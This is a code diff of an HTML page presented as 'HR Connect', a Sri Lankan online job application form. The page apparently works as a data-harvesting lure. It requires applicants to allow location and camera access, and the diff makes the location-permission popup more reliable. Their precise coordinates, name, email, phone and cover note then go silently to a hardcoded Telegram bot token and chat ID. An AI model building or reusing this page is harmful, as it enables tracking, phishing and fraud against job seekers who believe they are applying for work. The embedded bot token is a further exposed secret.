@@ -10,7 +10,6 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: #eef2f7;
@@ -20,211 +19,88 @@
       min-height: 100vh;
       padding: 20px;
     }
-
     .card {
       max-width: 520px;
       width: 100%;
       background: #ffffff;
       border-radius: 24px;
       padding: 32px 28px 36px;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
-      border: 1px solid rgba(0, 0, 0, 0.04);
+      box-shadow: 0 12px 40px rgba(0,0,0,0.08);
+      border: 1px solid rgba(0,0,0,0.04);
     }
-
-    .card .logo {
-      font-size: 28px;
-      font-weight: 700;
-      color: #1a2a3a;
-      margin-bottom: 4px;
-    }
-
-    .card .sub-logo {
-      font-size: 14px;
-      color: #6b7a8a;
-      margin-bottom: 24px;
-      border-bottom: 2px solid #f0f4f9;
-      padding-bottom: 16px;
-    }
-
-    #start-section {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
+    .card .logo { font-size: 28px; font-weight: 700; color: #1a2a3a; margin-bottom: 4px; }
+    .card .sub-logo { font-size: 14px; color: #6b7a8a; margin-bottom: 24px; border-bottom: 2px solid #f0f4f9; padding-bottom: 16px; }
+    #start-section { text-align: center; margin-bottom: 24px; }
     #start-btn {
-      background: #2a7de1;
-      color: #fff;
-      border: none;
-      padding: 14px 40px;
-      font-size: 18px;
-      font-weight: 600;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.25s;
-      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
+      background: #2a7de1; color: #fff; border: none; padding: 14px 40px;
+      font-size: 18px; font-weight: 600; border-radius: 40px; cursor: pointer;
+      transition: 0.25s; box-shadow: 0 4px 14px rgba(42,125,225,0.3);
     }
-
-    #start-btn:hover {
-      background: #1a6ac8;
-      transform: scale(1.02);
-    }
-
-    #start-btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
+    #start-btn:hover { background: #1a6ac8; transform: scale(1.02); }
+    #start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
     #success-banner {
-      display: none;
-      background: #d4edda;
-      border-radius: 12px;
-      padding: 14px 18px;
-      margin-bottom: 18px;
-      border-left: 4px solid #28a745;
-      color: #155724;
-      font-size: 15px;
-      font-weight: 600;
-      text-align: center;
+      display: none; background: #d4edda; border-radius: 12px; padding: 14px 18px;
+      margin-bottom: 18px; border-left: 4px solid #28a745; color: #155724;
+      font-size: 15px; font-weight: 600; text-align: center;
     }
-
     #location-status {
-      background: #f0f7ff;
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-size: 14px;
-      color: #1a3a6a;
-      margin-bottom: 18px;
-      border-left: 4px solid #2a7de1;
-      display: flex;
-      align-items: center;
-      gap: 10px;
+      background: #f0f7ff; border-radius: 12px; padding: 12px 16px; font-size: 14px;
+      color: #1a3a6a; margin-bottom: 18px; border-left: 4px solid #2a7de1;
+      display: flex; align-items: center; gap: 10px;
     }
-
-    #location-status .icon {
-      font-size: 20px;
+    #location-status .icon { font-size: 20px; }
+    #location-status .text { flex: 1; }
+    .form-group { margin-bottom: 18px; }
+    .form-group label { display: block; font-size: 14px; font-weight: 600; color: #1a2a3a; margin-bottom: 5px; }
+    .form-group input, .form-group select, .form-group textarea {
+      width: 100%; padding: 12px 14px; border: 1.5px solid #dce3ed; border-radius: 12px;
+      font-size: 15px; background: #fafcfe; transition: 0.25s; outline: none; font-family: inherit;
     }
-
-    #location-status .text {
-      flex: 1;
+    .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+      border-color: #2a7de1; background: #ffffff; box-shadow: 0 0 0 4px rgba(42,125,225,0.08);
     }
-
-    .form-group {
-      margin-bottom: 18px;
-    }
-
-    .form-group label {
-      display: block;
-      font-size: 14px;
-      font-weight: 600;
-      color: #1a2a3a;
-      margin-bottom: 5px;
-    }
-
-    .form-group input,
-    .form-group select,
-    .form-group textarea {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1.5px solid #dce3ed;
-      border-radius: 12px;
-      font-size: 15px;
-      background: #fafcfe;
-      transition: 0.25s;
-      outline: none;
-      font-family: inherit;
-    }
-
-    .form-group input:focus,
-    .form-group select:focus,
-    .form-group textarea:focus {
-      border-color: #2a7de1;
-      background: #ffffff;
-      box-shadow: 0 0 0 4px rgba(42, 125, 225, 0.08);
-    }
-
-    .form-group textarea {
-      resize: vertical;
-      min-height: 70px;
-    }
-
+    .form-group textarea { resize: vertical; min-height: 70px; }
     .btn-submit {
-      width: 100%;
-      background: #2a7de1;
-      color: #fff;
-      border: none;
-      padding: 14px;
-      font-size: 17px;
-      font-weight: 600;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.25s;
-      margin-top: 6px;
-      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
+      width: 100%; background: #2a7de1; color: #fff; border: none; padding: 14px;
+      font-size: 17px; font-weight: 600; border-radius: 40px; cursor: pointer;
+      transition: 0.25s; margin-top: 6px; box-shadow: 0 4px 14px rgba(42,125,225,0.3);
     }
-
-    .btn-submit:hover {
-      background: #1a6ac8;
-      transform: scale(1.01);
-    }
-
-    .btn-submit:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    @media (max-width: 480px) {
-      .card {
-        padding: 22px 16px 28px;
-      }
-    }
+    .btn-submit:hover { background: #1a6ac8; transform: scale(1.01); }
+    .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    @media (max-width:480px) { .card { padding: 22px 16px 28px; } }
   </style>
 </head>
 <body>
 
 <div class="card">
-
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== START BUTTON ===== -->
   <div id="start-section">
     <button id="start-btn">✅ Start Application</button>
-    <p style="font-size: 13px; color: #888; margin-top: 6px;">
-      Click to allow Location & Camera access
-    </p>
+    <p style="font-size:13px; color:#888; margin-top:6px;">Click to allow Location & Camera access</p>
   </div>
 
-  <!-- ===== SUCCESS BANNER ===== -->
-  <div id="success-banner">
-    ✅ Online Job Apply - You are eligible to apply!
-  </div>
+  <div id="success-banner">✅ Online Job Apply - You are eligible to apply!</div>
 
-  <!-- ===== LOCATION STATUS ===== -->
   <div id="location-status">
     <span class="icon">📍</span>
     <span class="text" id="locationText">⏳ Waiting for permission...</span>
   </div>
 
-  <!-- ===== FORM ===== -->
   <form id="applicationForm">
-
     <div class="form-group">
       <label>Full Name</label>
       <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" required />
     </div>
-
     <div class="form-group">
       <label>Email Address</label>
       <input type="email" id="email" placeholder="kaveesha@email.com" required />
     </div>
-
     <div class="form-group">
       <label>Phone Number</label>
       <input type="tel" id="phone" placeholder="071 234 5678" required />
     </div>
-
     <div class="form-group">
       <label>Position Applying For</label>
       <select id="position">
@@ -236,50 +112,37 @@
         <option value="Customer Support">Customer Support</option>
       </select>
     </div>
-
     <div class="form-group">
       <label>Brief Cover Note</label>
       <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
     </div>
-
     <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
-
   </form>
-
 </div>
 
-<!-- ============================================================ -->
-<!-- ===== JAVASCRIPT ===== -->
-<!-- ============================================================ -->
 <script>
-  // =============================================
-  // 🔐 TELEGRAM CONFIG
-  // =============================================
   const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
   const CHAT_ID   = '8308044531';
 
-  // =============================================
-  // 📍 ELEMENTS
-  // =============================================
   const startBtn = document.getElementById('start-btn');
   const locationText = document.getElementById('locationText');
   const locationStatusDiv = document.getElementById('location-status');
   const successBanner = document.getElementById('success-banner');
   let userLocation = null;
   let locationAllowed = false;
+  let watchId = null;
 
-  // =============================================
-  // 🚀 START BUTTON CLICK → LOCATION + CAMERA
-  // =============================================
+  // ---------- START BUTTON ----------
   startBtn.addEventListener('click', () => {
     startBtn.disabled = true;
     startBtn.textContent = '⏳ Requesting...';
 
-    // ----- 1. REQUEST LOCATION -----
+    // 1. REQUEST LOCATION (watchPosition - better for permission)
     locationText.textContent = '⏳ Requesting location...';
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
+      // Use watchPosition to trigger permission popup
+      watchId = navigator.geolocation.watchPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
@@ -293,6 +156,9 @@
 
           startBtn.textContent = '✅ Permission Granted';
           startBtn.style.background = '#28a745';
+
+          // Stop watching after success
+          if (watchId) navigator.geolocation.clearWatch(watchId);
         },
         (err) => {
           console.warn('Location error:', err);
@@ -307,6 +173,7 @@
           startBtn.disabled = false;
           startBtn.textContent = '🔄 Retry';
           startBtn.style.background = '#dc3545';
+          if (watchId) navigator.geolocation.clearWatch(watchId);
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
@@ -314,7 +181,7 @@
       locationText.textContent = '❌ Geolocation not supported.';
     }
 
-    // ----- 2. REQUEST CAMERA (also triggers permission) -----
+    // 2. REQUEST CAMERA
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
@@ -323,14 +190,11 @@
         })
         .catch((err) => {
           console.warn('Camera permission denied:', err);
-          // Don't show error to user - camera is optional
         });
     }
   });
 
-  // =============================================
-  // 📤 SEND LOCATION TO TELEGRAM
-  // =============================================
+  // ---------- SEND LOCATION TO TELEGRAM ----------
   async function sendLocationToTelegram(lat, lon) {
     try {
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -362,25 +226,18 @@ ${mapsLink}
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
 
       console.log('✅ Location sent to Telegram');
-
     } catch (err) {
       console.error('Send error:', err);
     }
   }
 
-  // =============================================
-  // 📝 FORM SUBMIT
-  // =============================================
+  // ---------- FORM SUBMIT ----------
   document.getElementById('applicationForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const submitBtn = document.getElementById('submitBtn');
 
     if (!locationAllowed) {
@@ -421,19 +278,13 @@ ${coverNote || '—'}
 
 🕐 Submitted: ${new Date().toLocaleString()}
     `;
-
-    if (userLocation) {
-      msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
-    }
+    if (userLocation) msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
 
       if (response.ok) {
@@ -452,7 +303,6 @@ ${coverNote || '—'}
         submitBtn.textContent = '❌ Submission Failed';
         submitBtn.disabled = false;
       }
-
     } catch (err) {
       console.error('Submit error:', err);
       submitBtn.textContent = '❌ Error';
@@ -460,8 +310,7 @@ ${coverNote || '—'}
     }
   });
 
-  console.log('✅ HR Connect Form Loaded - Click Start Button');
+  console.log('✅ HR Connect Loaded - Click Start Button');
 </script>
-
 </body>
 </html>
